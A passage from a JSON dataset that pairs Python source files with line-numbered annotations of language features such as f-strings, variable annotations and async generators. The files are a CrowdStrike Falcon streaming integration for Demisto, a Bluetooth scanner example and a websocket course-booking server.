            "file": "import demistomock as demisto\nfrom CommonServerPython import *  \nfrom CommonServerUserPython import *  \nimport requests\nimport traceback\nfrom asyncio import Event, create_task, sleep, run\nfrom contextlib import asynccontextmanager\nfrom aiohttp import ClientSession, TCPConnector\nfrom typing import Dict, AsyncGenerator, AsyncIterator\nfrom collections import deque\nrequests.packages.urllib3.disable_warnings()\nTOKEN_RETRIEVAL_HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}\nMINUTES_25 = 25 * 60\nMINUTES_30 = 30 * 60\nTIME_BUFFER_1_MINUTE = 1 * 60\nCREATED_STATUS_CODE = 201\nTOO_MANY_REQUESTS_STATUS_CODE = 429\nclass Client(BaseClient):\n    def __init__(self, base_url: str, app_id: str, verify_ssl: bool, proxy: bool) -> None:\n        self.app_id = app_id\n        self.refresh_stream_url = None\n        super().__init__(\n            base_url=base_url,\n            verify=verify_ssl,\n            proxy=proxy,\n            headers={\n                'Content-Type': 'application/json',\n                'Accept': 'application/json'\n            }\n        )\n    async def set_access_token(self, refresh_token: 'RefreshToken') -> None:\n        await refresh_token.set_access_token(self)\n        demisto.debug('Set access token successfully')\n    def set_auth_headers(self, token: str) -> None:\n        self._headers = {'Authorization': f'Bearer {token}'}\n        demisto.debug('Set auth headers successfully')\n    def discover_stream(self) -> Dict:\n        demisto.debug('Sending request to discover stream')\n        return self._http_request(\n            method='GET',\n            url_suffix='/sensors/entities/datafeed/v2',\n            params={'appId': self.app_id},\n        )\n    def refresh_stream_session(self) -> None:\n        demisto.debug('Sending request to refresh stream')\n        self._http_request(\n            method='POST',\n            url_suffix='',\n            full_url=self.refresh_stream_url\n        )\nclass EventStream:\n    def __init__(self, base_url: str, app_id: str, verify_ssl: bool, proxy: bool):\n        self.base_url = base_url\n        self.app_id = app_id\n        self.verify_ssl = verify_ssl\n        self.proxy = proxy\n        self.data_feed_url: str\n        self.session_token: str\n        self.refresh_token: RefreshToken\n    def set_refresh_token(self, refresh_token) -> None:\n        self.refresh_token = refresh_token\n    async def _discover_refresh_stream(self, event: Event) -> None:\n        client = Client(base_url=self.base_url, app_id=self.app_id, verify_ssl=self.verify_ssl, proxy=self.proxy)\n        while True:\n            if client.refresh_stream_url:\n                demisto.debug('Starting stream refresh')\n                client.refresh_stream_session()\n                demisto.debug('Finished stream refresh')\n            else:\n                await client.set_access_token(self.refresh_token)\n                demisto.debug('Starting stream discovery')\n                discover_stream_response = client.discover_stream()\n                demisto.debug('Finished stream discovery')\n                resources = discover_stream_response.get('resources', [])\n                if not resources:\n                    raise ValueError(f'Did not get event stream resources - {str(discover_stream_response)}')\n                resource = resources[0]\n                self.data_feed_url = resource.get('dataFeedURL')\n                demisto.debug(f'Discovered data feed URL: {self.data_feed_url}')\n                self.session_token = resource.get('sessionToken', {}).get('token')\n                refresh_url = resource.get('refreshActiveSessionURL')\n                client.refresh_stream_url = refresh_url\n                event.set()\n            await sleep(MINUTES_25)\n            event.clear()\n    async def fetch_event(\n            self, first_fetch_time: datetime, initial_offset: int = 0, event_type: str = ''\n    ) -> AsyncGenerator[Dict, None]:\n        while True:\n            demisto.debug('Fetching event')\n            event = Event()\n            create_task(self._discover_refresh_stream(event))\n            demisto.debug('Waiting for stream discovery or refresh')\n            await event.wait()\n            demisto.debug('Done waiting for stream discovery or refresh')\n            events_fetched = 0\n            new_lines_fetched = 0\n            last_fetch_stats_print = datetime.utcnow()\n            async with ClientSession(\n                connector=TCPConnector(ssl=self.verify_ssl),\n                headers={\n                    'Authorization': f'Token {self.session_token}',\n                    'Connection': 'keep-alive'\n                },\n                trust_env=self.proxy,\n                timeout=None\n            ) as session:\n                try:\n                    integration_context = demisto.getIntegrationContext()\n                    offset = integration_context.get('offset', 0) or initial_offset\n                    demisto.debug(f'Starting to fetch from offset {offset} events of type {event_type} '\n                                  f'from time {first_fetch_time}')\n                    async with session.get(\n                        self.data_feed_url,\n                        params={'offset': offset, 'eventType': event_type},\n                        timeout=None\n                    ) as res:\n                        demisto.debug(f'Fetched event: {res.content}')\n                        async for line in res.content:\n                            stripped_line = line.strip()\n                            if stripped_line:\n                                events_fetched += 1\n                                try:\n                                    streaming_event = json.loads(stripped_line)\n                                    event_metadata = streaming_event.get('metadata', {})\n                                    event_creation_time = event_metadata.get('eventCreationTime', 0)\n                                    if not event_creation_time:\n                                        demisto.debug('Could not extract \"eventCreationTime\" field, using 0 instead. '\n                                                      f'{streaming_event}')\n                                    else:\n                                        event_creation_time /= 1000\n                                    event_creation_time_dt = datetime.fromtimestamp(event_creation_time)\n                                    if event_creation_time_dt < first_fetch_time:\n                                        demisto.debug(f'Event with offset {event_metadata.get(\"offset\")} '\n                                                      f'and creation time {event_creation_time} was skipped.')\n                                        continue\n                                    yield streaming_event\n                                except json.decoder.JSONDecodeError:\n                                    demisto.debug(f'Failed decoding event (skipping it) - {str(stripped_line)}')\n                            else:\n                                new_lines_fetched += 1\n                            if last_fetch_stats_print + timedelta(minutes=1) <= datetime.utcnow():\n                                demisto.info(\n                                    f'Fetched {events_fetched} events and'\n                                    f' {new_lines_fetched} new lines'\n                                    f' from the stream in the last minute.')\n                                events_fetched = 0\n                                new_lines_fetched = 0\n                                last_fetch_stats_print = datetime.utcnow()\n                except Exception as e:\n                    demisto.debug(f'Failed to fetch event: {e} - Going to sleep for 10 seconds and then retry -'\n                                  f' {traceback.format_exc()}')\n                    await sleep(10)\nclass RefreshToken:\n    def __init__(self, base_url: str, client_id: str, client_secret: str, verify_ssl: bool, proxy: bool) -> None:\n        self.base_url: str = base_url\n        self.client_id: str = client_id\n        self.client_secret: str = client_secret\n        self.verify_ssl: bool = verify_ssl\n        self.proxy: bool = proxy\n        self.client: Client\n        self.token: str = ''\n        self.expiry_time: int = 0\n    async def set_access_token(self, client: Client) -> None:\n        self.client = client\n        if not self.token:\n            token = await self.get_access_token()\n            self.token = token\n        client.set_auth_headers(self.token)\n    async def get_access_token(self) -> str:\n        token = None\n        body = None\n        max_retries = 3\n        async with ClientSession(\n            connector=TCPConnector(ssl=self.verify_ssl),\n            headers=TOKEN_RETRIEVAL_HEADERS,\n            trust_env=self.proxy\n        ) as session:\n            for _ in range(max_retries):\n                data = {\n                    'client_id': self.client_id,\n                    'client_secret': self.client_secret\n                }\n                async with session.post(f'{self.base_url}/oauth2/token', data=data) as res:\n                    if res.status == TOO_MANY_REQUESTS_STATUS_CODE:\n                        demisto.debug('Token retrieval requests status: rate limit exceeded, will retry in 5 seconds.')\n                        await sleep(5)\n                    elif res.status == CREATED_STATUS_CODE:\n                        try:\n                            body = await res.json()\n                            break\n                        except json.decoder.JSONDecodeError:\n                            raise RuntimeError(\n                                f'Failed to decode successful token retrieval response: {str(res.content)}'\n                            )\n                    else:\n                        try:\n                            body = await res.json()\n                            error = body.get('errors', [{}])\n                            error_message = error[0].get('message', '')\n                            raise RuntimeError(\n                                f'Failed to retrieve token, verify client details are correct: {error_message}'\n                            )\n                        except json.decoder.JSONDecodeError:\n                            raise RuntimeError(\n                                f'Failed to decode token retrieval failure response: {str(res.content)}'\n                            )\n            if not body:\n                raise RuntimeError(f'Failed to retrieve token - got empty response: {str(res.content)}')\n            token = body.get('access_token')\n            self.expiry_time = body.get('expires_in', MINUTES_30) - TIME_BUFFER_1_MINUTE\n        if not token:\n            raise RuntimeError('Failed to retrieve token')\n        return token\n    async def refresh_token_loop(self) -> None:\n        while True:\n            await sleep(self.expiry_time)\n            token = await self.get_access_token()\n            self.token = token\n            self.client.set_auth_headers(token)\n@asynccontextmanager\nasync def init_refresh_token(\n        base_url: str,\n        client_id: str,\n        client_secret: str,\n        verify_ssl: bool,\n        proxy: bool\n) -> AsyncIterator[RefreshToken]:\n    refresh_token = RefreshToken(base_url, client_id, client_secret, verify_ssl, proxy)\n    await refresh_token.get_access_token()\n    task = create_task(refresh_token.refresh_token_loop())\n    yield refresh_token\n    task.cancel()\nasync def long_running_loop(\n        base_url: str,\n        client_id: str,\n        client_secret: str,\n        stream: EventStream,\n        offset: int,\n        event_type: str,\n        verify_ssl: bool,\n        proxy: bool,\n        incident_type: str,\n        first_fetch_time: datetime,\n        store_samples: bool = False\n) -> None:\n    try:\n        offset_to_store = offset\n        sample_events_to_store = deque(maxlen=20)  \n        last_integration_context_set = datetime.utcnow()\n        async with init_refresh_token(base_url, client_id, client_secret, verify_ssl, proxy) as refresh_token:\n            stream.set_refresh_token(refresh_token)\n            async for event in stream.fetch_event(\n                    first_fetch_time=first_fetch_time, initial_offset=offset, event_type=event_type\n            ):\n                event_metadata = event.get('metadata', {})\n                event_type = event_metadata.get('eventType', '')\n                event_offset = event_metadata.get('offset', '')\n                demisto.info(f'Fetching event with offset: {event_offset}')\n                incident_name = f'{event_type} - offset {event_offset}'\n                event_creation_time = event_metadata.get('eventCreationTime', 0)\n                occurred = datetime.fromtimestamp(event_creation_time / 1000).strftime('%Y-%m-%dT%H:%M:%SZ')\n                event_dump = json.dumps(event)\n                incident = [{\n                    'name': incident_name,\n                    'details': event_dump,\n                    'rawJSON': event_dump,\n                    'type': incident_type,\n                    'occurred': occurred\n                }]\n                demisto.createIncidents(incident)\n                offset_to_store = int(event_offset) + 1\n                if last_integration_context_set + timedelta(minutes=1) <= datetime.utcnow():\n                    integration_context = demisto.getIntegrationContext()\n                    integration_context['offset'] = offset_to_store\n                    if store_samples:\n                        try:\n                            sample_events_to_store.append(event)\n                            demisto.debug(f'Storing new {len(sample_events_to_store)} sample events')\n                            sample_events = deque(json.loads(integration_context.get('sample_events', '[]')), maxlen=20)\n                            sample_events += sample_events_to_store\n                            integration_context['sample_events'] = json.dumps(list(sample_events))\n                        except Exception as e:\n                            demisto.error(f'Failed storing sample events - {e}')\n                    demisto.debug(f'Storing offset {offset_to_store}')\n                    demisto.setIntegrationContext(integration_context)\n                    last_integration_context_set = datetime.utcnow()\n    except Exception as e:\n        demisto.error(f'An error occurred in the long running loop: {e}')\n    finally:\n        integration_context = demisto.getIntegrationContext()\n        integration_context['offset'] = offset_to_store\n        demisto.setIntegrationContext(integration_context)\nasync def test_module(base_url: str, client_id: str, client_secret: str, verify_ssl: bool, proxy: bool) -> None:\n    async with init_refresh_token(base_url, client_id, client_secret, verify_ssl, proxy) as refresh_token:\n        await refresh_token.get_access_token()\n        demisto.results('ok')\ndef fetch_samples() -> None:\n    integration_context = demisto.getIntegrationContext()\n    sample_events = json.loads(integration_context.get('sample_events', '[]'))\n    incidents = [{'rawJSON': json.dumps(event)} for event in sample_events]\n    demisto.incidents(incidents)\ndef get_sample_events(store_samples: bool = False) -> None:\n    integration_context = demisto.getIntegrationContext()\n    sample_events = integration_context.get('sample_events')\n    if sample_events:\n        try:\n            demisto.results(json.loads(sample_events))\n        except json.decoder.JSONDecodeError as e:\n            raise ValueError(f'Failed deserializing sample events - {e}')\n    else:\n        output = 'No sample events found.'\n        if not store_samples:\n            output += ' The \"Store sample events for mapping\" integration parameter ' \\\n                      'need to be enabled for this command to return results.'\n        demisto.results(output)\ndef main():\n    params: Dict = demisto.params()\n    base_url: str = params.get('base_url', '')\n    client_id: str = params.get('client_id', '')\n    client_secret: str = params.get('client_secret', '')\n    event_type = ','.join(params.get('event_type', []) or [])\n    verify_ssl = not params.get('insecure', False)\n    proxy = params.get('proxy', False)\n    offset = params.get('offset', '0')\n    try:\n        offset = int(offset)\n    except ValueError:\n        offset = 0\n    incident_type = params.get('incidentType', '')\n    store_samples = params.get('store_samples', False)\n    first_fetch_time, _ = parse_date_range(params.get('fetch_time', '1 hour'))\n    stream = EventStream(base_url=base_url, app_id='Demisto', verify_ssl=verify_ssl, proxy=proxy)\n    LOG(f'Command being called is {demisto.command()}')\n    try:\n        if demisto.command() == 'test-module':\n            run(test_module(base_url, client_id, client_secret, verify_ssl, proxy))\n        elif demisto.command() == 'long-running-execution':\n            run(long_running_loop(\n                base_url, client_id, client_secret, stream, offset, event_type, verify_ssl, proxy, incident_type,\n                first_fetch_time, store_samples\n            ))\n        elif demisto.command() == 'fetch-incidents':\n            fetch_samples()\n        elif demisto.command() == 'crowdstrike-falcon-streaming-get-sample-events':\n            get_sample_events(store_samples)\n    except Exception as e:\n        error_msg = f'Error in CrowdStrike Falcon Streaming v2: {str(e)}'\n        demisto.error(error_msg)\n        demisto.updateModuleHealth(error_msg)\n        return_error(error_msg)\nif __name__ in ('__main__', '__builtin__', 'builtins'):\n    main()",
            "patterns": {
                "pep_526": [
                    [
                        318,
                        "params: Dict = demisto.params()"
                    ],
                    [
                        319,
                        "base_url: str = params.get('base_url', '')"
                    ],
                    [
                        320,
                        "client_id: str = params.get('client_id', '')"
                    ],
                    [
                        321,
                        "client_secret: str = params.get('client_secret', '')"
                    ],
                    [
                        57,
                        "self.data_feed_url: str"
                    ],
                    [
                        58,
                        "self.session_token: str"
                    ],
                    [
                        59,
                        "self.refresh_token: RefreshToken"
                    ],
                    [
                        156,
                        "self.base_url: str = base_url"
                    ],
                    [
                        157,
                        "self.client_id: str = client_id"
                    ],
                    [
                        158,
                        "self.client_secret: str = client_secret"
                    ],
                    [
                        159,
                        "self.verify_ssl: bool = verify_ssl"
                    ],
                    [
                        160,
                        "self.proxy: bool = proxy"
                    ],
                    [
                        161,
                        "self.client: Client"
                    ],
                    [
                        162,
                        "self.token: str = ''"
                    ],
                    [
                        163,
                        "self.expiry_time: int = 0"
                    ]
                ],
                "pep_567": [
                    [
                        6,
                        6,
                        "import",
                        "from asyncio import Event, create_task, sleep, run"
                    ]
                ],
                "pep_563": [
                    [
                        31,
                        "    async def set_access_token(self, refresh_token: 'RefreshToken') -> None:",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        9,
                        "from typing import Dict, AsyncGenerator, AsyncIterator",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        222,
                        233,
                        "async generator",
                        "async def init_refresh_token(\n        base_url: str,\n        client_id: str,\n        client_secret: str,\n        verify_ssl: bool,\n        proxy: bool\n) -> AsyncIterator[RefreshToken]:\n    refresh_token = RefreshToken(base_url, client_id, client_secret, verify_ssl, proxy)\n    await refresh_token.get_access_token()\n    task = create_task(refresh_token.refresh_token_loop())\n    yield refresh_token\n    task.cancel()"
                    ],
                    [
                        86,
                        153,
                        "async generator",
                        "async def fetch_event(\n            self, first_fetch_time: datetime, initial_offset: int = 0, event_type: str = ''\n    ) -> AsyncGenerator[Dict, None]:\n        while True:\n            demisto.debug('Fetching event')\n            event = Event()\n            create_task(self._discover_refresh_stream(event))\n            demisto.debug('Waiting for stream discovery or refresh')\n            await event.wait()\n            demisto.debug('Done waiting for stream discovery or refresh')\n            events_fetched = 0\n            new_lines_fetched = 0\n            last_fetch_stats_print = datetime.utcnow()\n            async with ClientSession(\n                connector=TCPConnector(ssl=self.verify_ssl),\n                headers={\n                    'Authorization': f'Token {self.session_token}',\n                    'Connection': 'keep-alive'\n                },\n                trust_env=self.proxy,\n                timeout=None\n            ) as session:\n                try:\n                    integration_context = demisto.getIntegrationContext()\n                    offset = integration_context.get('offset', 0) or initial_offset\n                    demisto.debug(f'Starting to fetch from offset {offset} events of type {event_type} '\n                                  f'from time {first_fetch_time}')\n                    async with session.get(\n                        self.data_feed_url,\n                        params={'offset': offset, 'eventType': event_type},\n                        timeout=None\n                    ) as res:\n                        demisto.debug(f'Fetched event: {res.content}')\n                        async for line in res.content:\n                            stripped_line = line.strip()\n                            if stripped_line:\n                                events_fetched += 1\n                                try:\n                                    streaming_event = json.loads(stripped_line)\n                                    event_metadata = streaming_event.get('metadata', {})\n                                    event_creation_time = event_metadata.get('eventCreationTime', 0)\n                                    if not event_creation_time:\n                                        demisto.debug('Could not extract \"eventCreationTime\" field, using 0 instead. '\n                                                      f'{streaming_event}')\n                                    else:\n                                        event_creation_time /= 1000\n                                    event_creation_time_dt = datetime.fromtimestamp(event_creation_time)\n                                    if event_creation_time_dt < first_fetch_time:\n                                        demisto.debug(f'Event with offset {event_metadata.get(\"offset\")} '\n                                                      f'and creation time {event_creation_time} was skipped.')\n                                        continue\n                                    yield streaming_event\n                                except json.decoder.JSONDecodeError:\n                                    demisto.debug(f'Failed decoding event (skipping it) - {str(stripped_line)}')\n                            else:\n                                new_lines_fetched += 1\n                            if last_fetch_stats_print + timedelta(minutes=1) <= datetime.utcnow():\n                                demisto.info(\n                                    f'Fetched {events_fetched} events and'\n                                    f' {new_lines_fetched} new lines'\n                                    f' from the stream in the last minute.')\n                                events_fetched = 0\n                                new_lines_fetched = 0\n                                last_fetch_stats_print = datetime.utcnow()\n                except Exception as e:\n                    demisto.debug(f'Failed to fetch event: {e} - Going to sleep for 10 seconds and then retry -'\n                                  f' {traceback.format_exc()}')\n                    await sleep(10)"
                    ],
                    [
                        253,
                        287,
                        "async for",
                        "async for event in stream.fetch_event(\n                    first_fetch_time=first_fetch_time, initial_offset=offset, event_type=event_type\n            ):\n                event_metadata = event.get('metadata', {})\n                event_type = event_metadata.get('eventType', '')\n                event_offset = event_metadata.get('offset', '')\n                demisto.info(f'Fetching event with offset: {event_offset}')\n                incident_name = f'{event_type} - offset {event_offset}'\n                event_creation_time = event_metadata.get('eventCreationTime', 0)\n                occurred = datetime.fromtimestamp(event_creation_time / 1000).strftime('%Y-%m-%dT%H:%M:%SZ')\n                event_dump = json.dumps(event)\n                incident = [{\n                    'name': incident_name,\n                    'details': event_dump,\n                    'rawJSON': event_dump,\n                    'type': incident_type,\n                    'occurred': occurred\n                }]\n                demisto.createIncidents(incident)\n                offset_to_store = int(event_offset) + 1\n                if last_integration_context_set + timedelta(minutes=1) <= datetime.utcnow():\n                    integration_context = demisto.getIntegrationContext()\n                    integration_context['offset'] = offset_to_store\n                    if store_samples:\n                        try:\n                            sample_events_to_store.append(event)\n                            demisto.debug(f'Storing new {len(sample_events_to_store)} sample events')\n                            sample_events = deque(json.loads(integration_context.get('sample_events', '[]')), maxlen=20)\n                            sample_events += sample_events_to_store\n                            integration_context['sample_events'] = json.dumps(list(sample_events))\n                        except Exception as e:\n                            demisto.error(f'Failed storing sample events - {e}')\n                    demisto.debug(f'Storing offset {offset_to_store}')\n                    demisto.setIntegrationContext(integration_context)\n                    last_integration_context_set = datetime.utcnow()"
                    ],
                    [
                        119,
                        149,
                        "async for",
                        "async for line in res.content:\n                            stripped_line = line.strip()\n                            if stripped_line:\n                                events_fetched += 1\n                                try:\n                                    streaming_event = json.loads(stripped_line)\n                                    event_metadata = streaming_event.get('metadata', {})\n                                    event_creation_time = event_metadata.get('eventCreationTime', 0)\n                                    if not event_creation_time:\n                                        demisto.debug('Could not extract \"eventCreationTime\" field, using 0 instead. '\n                                                      f'{streaming_event}')\n                                    else:\n                                        event_creation_time /= 1000\n                                    event_creation_time_dt = datetime.fromtimestamp(event_creation_time)\n                                    if event_creation_time_dt < first_fetch_time:\n                                        demisto.debug(f'Event with offset {event_metadata.get(\"offset\")} '\n                                                      f'and creation time {event_creation_time} was skipped.')\n                                        continue\n                                    yield streaming_event\n                                except json.decoder.JSONDecodeError:\n                                    demisto.debug(f'Failed decoding event (skipping it) - {str(stripped_line)}')\n                            else:\n                                new_lines_fetched += 1\n                            if last_fetch_stats_print + timedelta(minutes=1) <= datetime.utcnow():\n                                demisto.info(\n                                    f'Fetched {events_fetched} events and'\n                                    f' {new_lines_fetched} new lines'\n                                    f' from the stream in the last minute.')\n                                events_fetched = 0\n                                new_lines_fetched = 0\n                                last_fetch_stats_print = datetime.utcnow()"
                    ]
                ],
                "pep_498": [
                    [
                        334,
                        "    LOG(f'Command being called is {demisto.command()}')"
                    ],
                    [
                        35,
                        "        self._headers = {'Authorization': f'Bearer {token}'}"
                    ],
                    [
                        348,
                        "        error_msg = f'Error in CrowdStrike Falcon Streaming v2: {str(e)}'"
                    ],
                    [
                        260,
                        "                incident_name = f'{event_type} - offset {event_offset}'"
                    ],
                    [
                        289,
                        "        demisto.error(f'An error occurred in the long running loop: {e}')"
                    ],
                    [
                        79,
                        "                demisto.debug(f'Discovered data feed URL: {self.data_feed_url}')"
                    ],
                    [
                        209,
                        "                raise RuntimeError(f'Failed to retrieve token - got empty response: {str(res.content)}')"
                    ],
                    [
                        259,
                        "                demisto.info(f'Fetching event with offset: {event_offset}')"
                    ],
                    [
                        310,
                        "            raise ValueError(f'Failed deserializing sample events - {e}')"
                    ],
                    [
                        76,
                        "                    raise ValueError(f'Did not get event stream resources - {str(discover_stream_response)}')"
                    ],
                    [
                        111,
                        "                    demisto.debug(f'Starting to fetch from offset {offset} events of type {event_type} '"
                    ],
                    [
                        184,
                        "                async with session.post(f'{self.base_url}/oauth2/token', data=data) as res:"
                    ],
                    [
                        285,
                        "                    demisto.debug(f'Storing offset {offset_to_store}')"
                    ],
                    [
                        102,
                        "                    'Authorization': f'Token {self.session_token}',"
                    ],
                    [
                        118,
                        "                        demisto.debug(f'Fetched event: {res.content}')"
                    ],
                    [
                        151,
                        "                    demisto.debug(f'Failed to fetch event: {e} - Going to sleep for 10 seconds and then retry -'"
                    ],
                    [
                        279,
                        "                            demisto.debug(f'Storing new {len(sample_events_to_store)} sample events')"
                    ],
                    [
                        144,
                        "                                    f'Fetched {events_fetched} events and'"
                    ],
                    [
                        202,
                        "                                f'Failed to retrieve token, verify client details are correct: {error_message}'"
                    ],
                    [
                        284,
                        "                            demisto.error(f'Failed storing sample events - {e}')"
                    ],
                    [
                        194,
                        "                                f'Failed to decode successful token retrieval response: {str(res.content)}'"
                    ],
                    [
                        206,
                        "                                f'Failed to decode token retrieval failure response: {str(res.content)}'"
                    ],
                    [
                        128,
                        "                                        demisto.debug('Could not extract \"eventCreationTime\" field, using 0 instead. '"
                    ],
                    [
                        134,
                        "                                        demisto.debug(f'Event with offset {event_metadata.get(\"offset\")} '"
                    ],
                    [
                        139,
                        "                                    demisto.debug(f'Failed decoding event (skipping it) - {str(stripped_line)}')"
                    ]
                ]
            }
        },
        "148": {
            "file": "import asyncio\nfrom bleak import BleakScanner\nasync def main():\n    async with BleakScanner() as scanner:\n        print(\"Scanning...\")\n        n = 5\n        print(f\"\\n{n} advertisement packets:\")\n        async for bd, ad in scanner.advertisement_data():\n            print(f\" {n}. {bd!r} with {ad!r}\")\n            n -= 1\n            if n == 0:\n                break\n        n = 10\n        print(f\"\\nFind device with name longer than {n} characters...\")\n        async for bd, ad in scanner.advertisement_data():\n            found = len(bd.name or \"\") > n or len(ad.local_name or \"\") > n\n            print(f\" Found{' it' if found else ''} {bd!r} with {ad!r}\")\n            if found:\n                break\nif __name__ == \"__main__\":\n    asyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        8,
                        12,
                        "async for",
                        "async for bd, ad in scanner.advertisement_data():\n            print(f\" {n}. {bd!r} with {ad!r}\")\n            n -= 1\n            if n == 0:\n                break"
                    ],
                    [
                        15,
                        19,
                        "async for",
                        "async for bd, ad in scanner.advertisement_data():\n            found = len(bd.name or \"\") > n or len(ad.local_name or \"\") > n\n            print(f\" Found{' it' if found else ''} {bd!r} with {ad!r}\")\n            if found:\n                break"
                    ]
                ],
                "pep_498": [
                    [
                        7,
                        "        print(f\"\\n{n} advertisement packets:\")"
                    ],
                    [
                        14,
                        "        print(f\"\\nFind device with name longer than {n} characters...\")"
                    ],
                    [
                        9,
                        "            print(f\" {n}. {bd!r} with {ad!r}\")"
                    ],
                    [
                        17,
                        "            print(f\" Found{' it' if found else ''} {bd!r} with {ad!r}\")"
                    ]
                ]
            }
        },
        "149": {
            "file": "import asyncio\nimport websockets\nimport logging\nimport pandas as pd  \nimport csv\nimport lxml.etree as et\nimport sys\nimport os\nimport helper \nxml = os.path.join(sys.path[0], 'kurse.xml')  \nschema = os.path.join(sys.path[0], 'kurse.xsd')         \nrequest_schema = os.path.join(sys.path[0], 'request.xsd')  \ndef find_all_courses(format):\n  tree = et.parse(xml)\n  root = tree.getroot()\n  chunk = []\n  if (format == 'xml'):\n    tree = helper.xml_trimmer(tree)\n    root = tree.getroot()\n    output_string = et.tostring(root, encoding=\"utf8\")\n    chunk.append(output_string[0 : 475860])\n    chunk.append(output_string[475860 : 961720])\n    chunk.append(output_string[961720 : -1])\n    return chunk\n  else: \n    rows = []\n    spamreader = ''\n    cols = ['Guid', 'Nummer', 'Name', 'Untertitel']\n    file_name = 'courses.%s.csv' % os.getpid()\n    try:\n      with open(file_name, 'w', newline='', encoding=\"utf8\") as file:\n        for elem in root:\n          rows.append({ \"Guid\": elem.find('guid').text, \"Nummer\": elem.find('nummer').text, \n                        \"Name\": elem.find('name').text, \"Untertitel\": elem.find('untertitel').text \n                      })\n        dataframe = pd.DataFrame(rows, columns = cols) \n        dataframe.to_csv(file_name)\n    except IOError:\n      print(\"I/O error\")\n    finally:\n      with open(file_name, encoding=\"utf8\") as f:\n        output_string = f.read() + '\\n'\n      os.remove(file_name)\n    return output_string \ndef find_my_bookings(format, path):\n  joined_string = \"\"\n  if (format == 'xml'):\n    tree = helper.xml_trimmer_mybooks(et.parse(xml))\n    root = tree.getroot()\n    elems = root.xpath(path)\n    for targ in elems: \n      for dept in targ.xpath('ancestor-or-self::veranstaltung'):\n        joined_string = joined_string + et.tostring(dept, encoding=\"unicode\", pretty_print=True)\n    return joined_string\n  else:   \n    my_dict = {}\n    rows = []\n    tree = et.parse(xml)\n    root = tree.getroot()\n    cols = [' Name', ' Untertitel', ' Minimale Teilnehmerzahl', ' Maximale Teilnehmerzahl', ' Beginn Datum', ' Anzahl Buchungen']\n    file_name = 'my_courses%s.csv' % os.getpid()\n    for targ in root.xpath(path): \n      for dept in targ.xpath('ancestor-or-self::veranstaltung'):\n        my_dict[dept[0].text] = { \"Name\" : dept[2].text, \n                                  \"Untertitel\" : dept[3].text,\n                                  \"Minimale Teilnehmerzahl\" : dept[5].text,\n                                  \"Maximale Teilnehmerzahl\" : dept[6].text,\n                                  \"Beginn Datum\" : dept[8].text,\n                                  \"Anzahl Buchungen\": 'test'\n                                }                                                                   \n    try:\n      with open(file_name, 'w') as file:\n        for elem in my_dict:\n          rows.append({ \" Name\": my_dict[elem]['Name'], \" Untertitel\": my_dict[elem]['Untertitel'],\n                        \" Minimale Teilnehmerzahl\": my_dict[elem]['Minimale Teilnehmerzahl'], \n                        \" Maximale Teilnehmerzahl\": my_dict[elem]['Maximale Teilnehmerzahl'], \n                        \" Beginn Datum\": my_dict[elem]['Beginn Datum'],\n                        \" Anzahl Buchungen\": my_dict[elem]['Anzahl Buchungen']  \n                      })\n        dataframe = pd.DataFrame(rows, columns = cols) \n        dataframe.to_csv(file_name)\n    except IOError:\n        print(\"I/O error\")\n    finally:\n      with open(file_name, encoding=\"utf8\") as f:\n        output_string = f.read() + '\\n'\n      os.remove(file_name)\n    return output_string\ndef find_diverse_from_query(format, path, calltype=''):\n  joined_string = \"\"\n  if (format == 'xml'):\n    tree = helper.xml_trimmer(et.parse(xml))\n    root = tree.getroot()\n    elems = root.xpath(path)\n    for targ in elems: \n      for dept in targ.xpath('ancestor-or-self::veranstaltung'):\n        joined_string = joined_string + et.tostring(dept, encoding=\"unicode\", pretty_print=True)\n    return joined_string\n  else:   \n    my_dict = {}\n    rows = []\n    tree = et.parse(xml)\n    root = tree.getroot()\n    cols = [' Guid', ' Nummer', ' Name', ' Untertitel']\n    file_name = 'my_courses%s.csv' % os.getpid()\n    for targ in root.xpath(path): \n      for dept in targ.xpath('ancestor-or-self::veranstaltung'):\n        my_dict[dept[0].text] = { \"Guid\" : dept[0].text, \"Nummer\" : dept[1].text,\n                                  \"Name\" : dept[2].text,\n                                  \"Untertitel\" : dept[3].text\n                                }                                                                   \n    try:\n      with open(file_name, 'w') as file:\n        for elem in my_dict:\n          rows.append({ \" Guid\": my_dict[elem]['Guid'], \" Nummer\": my_dict[elem]['Nummer'],\n                        \" Name\": my_dict[elem]['Name'], \" Untertitel\": my_dict[elem]['Untertitel'],\n                      })\n        dataframe = pd.DataFrame(rows, columns = cols) \n        dataframe.to_csv(file_name)\n    except IOError:\n        print(\"I/O error\")\n    finally:\n      with open(file_name, encoding=\"utf8\") as f:\n        output_string = f.read() + '\\n'\n      os.remove(file_name)\n    return output_string\ndef xml_validator(input, schema):\n    with open(schema, 'rb') as s:\n      schema_root = et.XML(s.read())\n      val_schema = et.XMLSchema(schema_root)\n      parser = et.XMLParser(schema=val_schema)\n    try:\n      et.fromstring(input, parser) \n      return True \n    except et.XMLSyntaxError: \n      print(\"Request Fehler: Falscher Request\") \nasync def echo(websocket, path):\n  async for message in websocket:\n    if xml_validator(message, request_schema):\n      tree = et.ElementTree(et.fromstring(message))\n      format = tree.xpath('//format')[0].text\n      calltype = tree.xpath('//calltype')[0].text\n      if (calltype == 'acs'):\n          if (format == 'xml'):\n            response = find_all_courses(format)\n            for elem in response:\n              await websocket.send(elem)\n          else: \n            await websocket.send(str(find_all_courses(format)))\n      elif (calltype == 'sse'):\n        elem = tree.xpath('//element')[0].text\n        value = tree.xpath('//value')[0].text\n        if (elem == 'divers'):\n          path = helper.path_constructor_divers(value)\n        else: \n          path = helper.path_constructor_elem(elem, value) \n        await websocket.send(find_diverse_from_query(format, path, calltype))\n      elif (calltype == 'mcs'):\n        client_id = tree.xpath('//client')[0].text\n        path = helper.path_constructor_book(client_id)\n        await websocket.send(str(find_my_bookings(format, path)))\n      elif (calltype == 'bwg'):\n        client_id = tree.xpath('//client')[0].text\n        guid = tree.xpath('//guid')[0].text\n        try:\n          helper.add_kunde_to_course(guid, client_id)\n        except:\n          await websocket.send('Leider wurde die GUID nicht gefunden.')\n        else:\n          await websocket.send('Buchung erfolgreich!')\n    else:\n        await websocket.send('Falscher Request')\nasyncio.get_event_loop().run_until_complete( websockets.serve(echo, \"localhost\", 8765, max_size = 2**25, ping_timeout=10000000) )\nprint(\"Running service at 